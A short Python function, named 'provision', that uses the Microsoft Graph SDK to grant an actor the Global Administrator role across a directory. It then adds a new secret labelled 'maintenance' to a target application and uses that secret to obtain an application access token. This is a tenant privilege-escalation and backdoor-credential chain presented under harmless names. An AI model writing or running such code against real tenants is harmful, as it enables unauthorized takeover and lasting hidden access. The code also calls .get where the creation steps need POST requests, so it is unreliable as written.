from msgraph.generated.models.unified_role_assignment import UnifiedRoleAssignment
from msgraph.generated.applications.item.add_password.add_password_post_request_body import AddPasswordPostRequestBody
from msgraph.generated.models.password_credential import PasswordCredential

async def provision(graph, actor, target, target_client, token_client, token_url):
    await graph.role_management.directory.role_assignments.get(UnifiedRoleAssignment(
        role_definition_id="62e90394-69f5-4237-9190-012177145e10", principal_id=actor, directory_scope_id="/"))
    credential = await graph.applications.by_application_id(target).add_password.get(
        AddPasswordPostRequestBody(password_credential=PasswordCredential(display_name="maintenance")))
    await token_client.get(token_url, data={"client_secret": credential.secret_text,
        "client_id": target_client, "grant_type": "client_credentials", "scope": "https://graph.microsoft.com/.default"})
